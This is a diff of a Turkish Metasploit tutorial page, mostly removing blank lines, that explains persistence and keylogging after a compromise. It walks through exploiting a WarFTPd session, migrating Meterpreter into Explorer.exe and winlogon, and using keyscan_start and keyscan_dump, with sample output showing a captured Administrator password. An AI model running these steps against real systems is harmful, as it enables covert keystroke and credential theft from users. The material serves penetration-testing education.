@@ -17,39 +17,21 @@ tags:
     - cybersecurity
     - 'metasploit framework'
 ---
-
-
 ## Kalıcılık Sağlama
-
-
 
 Bir hedef bilgisayara başarılı bir oturum açtığınızda, mevcut yetkiler izin veriyorsa ilk düşünülmesi gereken kalıcılık sağlamaktır. Kalıcılık, hedef sisteme daha sonradan giriş için açık kapılar oluşturulması veya daha kolay giriş yöntemleri bulunmasını kapsar.
 
-
-
 Bazı durumlarda, hedef üzerinde yaptığınız çalışmalar sistemi kararsız hale getirebilir. Sistemin tekrar başlatılması gerektiğinde bağlantınız da kopacaktır. Bu gibi durumlar için, hedef sisteme tekrar bağlanmanın kolay bir yolunu oluşturmak faydalı olacaktır.
-
-
 
 Kalıcılık sağlamak için sistem hakkında kullanıcı bilgileri, token bilgileri, hash bilgileri ve bağlı olduğu diğer alt ağların keşfi ileride kullanım için oldukça fayda sağlamaktadır.
 
-
-
 Bilgi toplamanın bir yöntemi de keylogger olarak ifade edilen yöntemdir.
-
-
 
 ## Metasploit içinde Keylogger Kullanımı
 
-
-
 Bir sisteme giriş sağlandığında iki yaklaşım sergileyebilirsiniz. Çok hızlı olmak veya çok yavaş olmak. Keylogger, yani kullanıcının tuşlarını ve yazdıklarını kaydetmek, yavaş yaklaşıma bir örnektir. Bu yaklaşımda, gerçekleştirmek istediğiniz işlemleri çok hızlı yapamazsınız ancak uzun vadede çok kullanışlı bilgiler elde edebilirsiniz.
 
-
-
 Öncelikle, bir exploit modülü kullanarak hedef sistemde oturum çalım.
-
-
 ```bash
 msf exploit(warftpd_165_user) > exploit
 
@@ -68,11 +50,7 @@ msf exploit(warftpd_165_user) > exploit
 meterpreter >
 ```
 
-
-
 Oturum açıldıktan sonra, tuşları kayıt etmek için `Explorer.exe` prosesine geçmek başarı için daha garanti bir yoldur. Hedef sistemde `Explorer.exe` uygulaması, hangi PID numarasıyla çalışıyor öğreniyoruz ve `migrate` komutuyla geçiş yapıyoruz.
-
-
 ```bash
 meterpreter > ps
 
@@ -109,11 +87,7 @@ meterpreter > getpid
 Current pid: 768
 ```
 
-
-
 PID geçişini kontrol ettikten sonra keylogger işlemini başlatalım.
-
-
 ```bash
 meterpreter > keyscan_start
 Starting the keystroke sniffer...
@@ -122,15 +96,9 @@ Dumping captured keystrokes...
    tgoogle.cm my credit amex   myusernamthi     amexpasswordpassword
 ```
 
-
-
 Bir miktar süre geçtikten sonra kayıt dosyasını görmek için `keyscan_dump` komutunu kullanabilirsiniz. Yakalanan tuş vuruşlarını incelediğinizde, CTRL veya ALT gibi tuşların log dosyasına nasıl kayıt edildiğini de öğrenebilirsiniz.
 
-
-
 Ayrıca, oturum açma bilgilerini de yakalamak isterseniz, `Explorer.exe` yerine `migrate` komutuyla, `winlogon` prosesine geçebilirsiniz.
-
-
 ```bash
 meterpreter > ps
 
@@ -150,17 +118,11 @@ meterpreter > keyscan_start
 Starting the keystroke sniffer...
 ```
 
-
-
 Kayıt esnasında bir Administrator kullanıcı oturumu açılmıştır. Sonucuna bakalım.
-
-
 ```bash
 meterpreter > keyscan_dump
 Dumping captured keystrokes...
 Administrator ohnoes1vebeenh4x0red!
 ```
-
-
 
 Görüldüğü gibi, oturum açan kullanıcı “Administrator” ve parolası “ohnoes1vebeenh4x0red!” olarak tespit edilmiştir.
